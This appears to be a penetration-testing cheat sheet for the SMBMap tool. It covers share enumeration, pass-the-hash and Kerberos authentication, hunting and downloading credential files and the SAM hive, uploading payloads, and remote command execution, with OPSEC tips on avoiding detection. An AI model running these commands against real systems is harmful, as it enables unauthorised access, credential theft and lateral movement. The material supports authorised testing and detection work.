---
title: "SMBMap"
description: "SMBMap share enumeration, permissions mapping, file download/upload and command execution over SMB."
category: enumeration
tags: [enumeration, smb, shares]
tools: [SMBMap]
difficulty: beginner
updated: "2026-08-09"
source: "vault:Enumeration/SMBMAP.md"
---

# SMBMap

SMBMap enumerates SMB shares and permissions (READ/WRITE/NO ACCESS), lists and downloads files, and can execute commands across single hosts or a network range. Requires Python 3 (`pip3 install smbmap` or the Kali package). Version referenced: v1.10.7.

## Share Enumeration (authenticated & null session)

Enumerate shares, permissions, and host metadata. Needs port 445 reachable.

```bash
# Null session (anonymous)
smbmap -H 192.168.1.10

# Authenticated with password
smbmap -u jsmith -p 'Password1!' -d CORP -H 192.168.1.10

# Pass-the-Hash (NTLM)
smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -H 192.168.1.10

# Host-file sweep (IPs, FQDNs, or CIDR accepted)
smbmap --host-file targets.txt -u jsmith -p 'Password1!' -d CORP

# Check admin access only
smbmap -u jsmith -p 'Password1!' -H 192.168.1.10 --admin

# Check SMB signing status
smbmap -u jsmith -p 'Password1!' -H 192.168.1.10 --signing

# Return OS version
smbmap -u jsmith -p 'Password1!' -H 192.168.1.10 -v
```

**Auth & enumeration flags:**

| Flag | Description | Default |
|---|---|---|
| `-H HOST` | Target IP or FQDN | — |
| `--host-file FILE` | File of hosts (IP/FQDN/CIDR) | — |
| `-u USERNAME` | Username; omit for null session | null |
| `-p PASSWORD` | Plaintext or `LMHASH:NTHASH` | — |
| `--prompt` | Prompt for password (avoids shell history) | off |
| `-d DOMAIN` | Domain name | WORKGROUP |
| `-P PORT` | SMB port | 445 |
| `-v` | Return remote OS version | off |
| `--admin` | Report if user is admin only | off |
| `--signing` | Check SMB signing state | off |
| `--no-write-check` | Skip write permission check (quieter) | off |
| `--timeout SEC` | Socket connect timeout | 0.5s |
| `--no-banner` | Suppress banner | off |
| `--no-color` | Suppress colour output | off |

```bash
# PtH against an entire /24
smbmap --host-file hosts.txt -u admin -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -d CORP

# Suppress write check for stealth (fewer WRITE probes)
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --no-write-check -q

# Output to CSV for reporting
smbmap -u jsmith -p 'Password1!' --host-file targets.txt --csv results.csv
```

**Output interpretation:**
- `ADMIN!!!` next to host → current user has admin privileges.
- `READ, WRITE` → full access; high value for lateral movement or payload staging.
- `NO ACCESS` → share visible but inaccessible.
- `READ ONLY` → can list/download, cannot write.

**OPSEC:** every connection creates Windows Event ID **4624** (logon) and **4648** (explicit creds); **4776** for NTLM auth. The write check attempts a dummy directory create (visible in the Security log). Default WMI execution mode (`-x`) spawns WMI activity → **4688**/Sysmon **1**. Host-file sweeps produce rapid multi-host auth attempts that will trip lockout policies and brute-force detections if creds are wrong.

## Directory & File Listing

Recursively enumerate share contents. Needs READ access; deeper traversal of admin shares (`C$`, `ADMIN$`) may require elevated creds.

```bash
# List root of ALL shares
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r

# Recurse into a specific path
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r 'Finance/Payroll'

# Set depth of traversal (default: 1)
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r --depth 5

# List directories only (no files)
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r --dir-only

# List all local drives (requires admin)
smbmap -u administrator -p 'Password1!' -H 10.10.10.10 -L

# Exclude noisy default shares
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r --exclude ADMIN$ IPC$ print$
```

| Flag | Description | Default |
|---|---|---|
| `-r [PATH]` | Recursive list; no path = all share roots | all shares |
| `--depth N` | Max traversal depth | 1 |
| `--dir-only` | Omit files, show directories only | off |
| `--exclude SHARE…` | Skip named shares | none |
| `-L` | List local drives (admin required) | off |
| `-g FILE` | Grep-friendly output file (used with `-r`) | none |
| `--csv FILE` | CSV output | none |
| `-q` | Quiet: show only READ/WRITE shares | off |

```bash
# Full recursive enum of a share, output to grep file
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r 'Users' --depth 4 -g users_out.txt

# Quiet CSV output across subnet
smbmap -u jsmith -p 'Password1!' --host-file targets.txt -r --csv shares.csv -q
```

Look for `.config`, `.xml`, `.kdbx`, `.ps1`, `.bat`, `id_rsa`, `web.config`, `*.bak`. Deep recursion (`--depth > 3`) generates high SMB read volume (detectable by DLP/EDR); scope to a single share to reduce noise. `STATUS_ACCESS_DENIED` → creds lack access; try admin creds.

## File Pattern Matching & Auto-Download

Search share filenames by regex and auto-download matches. Requires `-r`; patterns are case-insensitive.

```bash
# Auto-download all config/web files
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r -A '(web|global)\.(asax|config)'

# Find and grab any file with "password"/"cred" in the name
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r -A '(password|cred|secret|pass)' --depth 5

# Match backup or KeePass files
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r -A '\.(kdbx|bak|old|zip|7z)$' --depth 6 -q
```

| Flag | Description | Default |
|---|---|---|
| `-A PATTERN` | Regex for filename match; auto-downloads on hit (requires `-r`) | off |
| `-r [PATH]` | Required with `-A` | — |
| `--depth N` | How deep to search | 1 |
| `-q` | Suppress non-matching output | off |

```bash
# Hunt for SSH keys and certs
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r 'Users' -A '(id_rsa|\.pem|\.pfx|\.p12|\.ppk)' --depth 6 -q

# Grab PowerShell and batch scripts
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 -r 'NETLOGON' -A '\.(ps1|bat|cmd|vbs)$' --depth 4
```

Matched files download to the current directory as `[hostname]_[share]_[filename]`. No downloads despite hits → check write perms on your CWD. Test regex separately: `python3 -c "import re; re.compile('PATTERN')"`.

## File Content Search (`-F`)

Search the *content* of remote files via regex, executed through PowerShell on the victim. Requires admin creds, PowerShell on target, and running smbmap as **root** (experimental feature).

```bash
# Search for password strings in C:\Users (default path)
sudo smbmap -u administrator -p 'P@ssw0rd' -H 10.10.10.10 -F '[Pp]assword'

# Search a specific drive/path
sudo smbmap -u administrator -p 'P@ssw0rd' -H 10.10.10.10 -F '[Pp]assword' --search-path 'D:\HR\'

# Extend timeout for large drives (default 300s)
sudo smbmap -u administrator -p 'P@ssw0rd' -H 10.10.10.10 -F 'api.key|secret' --search-timeout 600
```

| Flag | Description | Default |
|---|---|---|
| `-F PATTERN` | Regex to search file contents | — |
| `--search-path PATH` | Drive/path to search | `C:\Users` |
| `--search-timeout SEC` | Kill job after N seconds | 300 |

> **Warning — `-F` is the noisiest smbmap feature.** It drops and deletes a temp `.txt` under `C:\Temp\` (Sysmon EID 11/23), triggers PowerShell script-block logging (**4104**) and process creation (**4688**), and touches admin shares (**5140/5145**). Avoid in engagements with mature EDR/SIEM.

## File Upload / Download / Delete

Transfer files to/from shares or delete remote files. Needs WRITE for upload/delete, READ for download.

```bash
# Download a file
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --download 'C$\Users\jsmith\Desktop\passwords.txt'

# Upload a file
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --upload '/tmp/payload.exe' 'C$\Temp\payload.exe'

# Delete a file (prompts confirmation)
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --delete 'C$\Temp\payload.exe'

# Delete without confirmation prompt
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --delete 'C$\Temp\payload.exe' --skip
```

| Flag | Description |
|---|---|
| `--download PATH` | Remote path in `SHARE\path\file` format |
| `--upload SRC DST` | Local src path, then remote `SHARE\path\file` |
| `--delete PATH` | Remote path to delete |
| `--skip` | Skip delete confirmation |

```bash
# Grab SAM hive backup
smbmap -u administrator -p 'P@ssw0rd' -H 10.10.10.10 --download 'C$\Windows\Repair\SAM'

# Stage a tool to a writable share, then clean up
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --upload '/opt/tools/tool.exe' 'Data\tool.exe'
smbmap -u jsmith -p 'Password1!' -H 10.10.10.10 --delete 'Data\tool.exe' --skip
```

**OPSEC:** writes to admin shares (`C$`) generate **5145** and **4663**; uploading executables to `C$\Temp\` is a high-confidence IOC (AV/EDR scans on write). Prefer writable non-admin shares. `STATUS_ACCESS_DENIED` on upload → share is READ only or path doesn't exist (create the directory first).

## Remote Command Execution

Execute commands via WMI (default) or PsExec over SMB. Requires admin creds; WMI needs port 445 + DCOM ports open.

```bash
# Execute command via WMI (default)
smbmap -u administrator -p 'P@ssw0rd' -d CORP -H 10.10.10.10 -x 'whoami'

# Execute via PsExec
smbmap -u administrator -p 'P@ssw0rd' -d CORP -H 10.10.10.10 -x 'whoami' --mode psexec

# Domain group enumeration
smbmap -u administrator -p 'P@ssw0rd' -d CORP -H 10.10.10.10 -x 'net group "Domain Admins" /domain'

# PtH command exec
smbmap -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -H 10.10.10.10 -x 'ipconfig /all'
```

| Flag | Description | Default |
|---|---|---|
| `-x COMMAND` | Command string to execute | — |
| `--mode CMDMODE` | `wmi` or `psexec` | `wmi` |

Output is returned inline (no interactive shell); empty output often means the command ran with no stdout. WMI → **4688**/Sysmon **1** + WMI-Activity/Operational log. PsExec → creates a service (**7045**, very high-fidelity). Prefer WMI for a lower footprint. No output returned → WMI may be firewalled (TCP 135 + dynamic RPC); try `--mode psexec`.

## Kerberos Authentication

Authenticate to shares with Kerberos tickets (Pass-the-Ticket / ccache). Needs a valid `.ccache`, `KRB5CCNAME` set, and the DC reachable by FQDN (marked "super beta" by the developer).

```bash
# Set ccache path and use Kerberos auth (no password)
export KRB5CCNAME='/tmp/jsmith.ccache'
smbmap -k --no-pass -H dc01.corp.local -d CORP --dc-ip 10.10.10.1

# Kerberos with username (overpass-the-hash scenarios)
export KRB5CCNAME='/tmp/jsmith.ccache'
smbmap -k -u jsmith -H fileserver.corp.local -d CORP --dc-ip 10.10.10.1
```

| Flag | Description |
|---|---|
| `-k` / `--kerberos` | Enable Kerberos authentication |
| `--no-pass` | Use ccache only (no password prompt) |
| `--dc-ip IP/Host` | IP or FQDN of Domain Controller |

Kerberos avoids sending NTLM hashes over the wire (no NTLM-relay signal) but still generates **4624** (logon type 3) and **4769** (service ticket) on the DC.

> **Note — Common errors.** `Kerberos SessionError` → clock skew > 5 min, sync with `ntpdate`/`faketime`. Must use the FQDN (`-H dc01.corp.local`), not the IP — SPN resolution fails on a raw IP. If `KRB5CCNAME` is unset the tool may silently fall back to NTLM; always verify the env var.

## Version / Platform Notes

- Requires Python 3; legacy Python 2 support dropped.
- `--signing` was added in recent versions; not present in older Kali packages.
- `-A` (filename pattern auto-download) requires `-r`; use lowercase `-r` (mixing with the old `-R` flag can error on newer installs).
- On Kali, the system package may lag behind PyPI; prefer `pip3 install --upgrade smbmap` for the latest.
- `--host-file` accepts IPs, FQDNs, and CIDR notation.

## Sources

- https://github.com/ShawnDEvans/smbmap
- https://manpages.debian.org/bookworm/smbmap/smbmap.1.en.html
- https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/
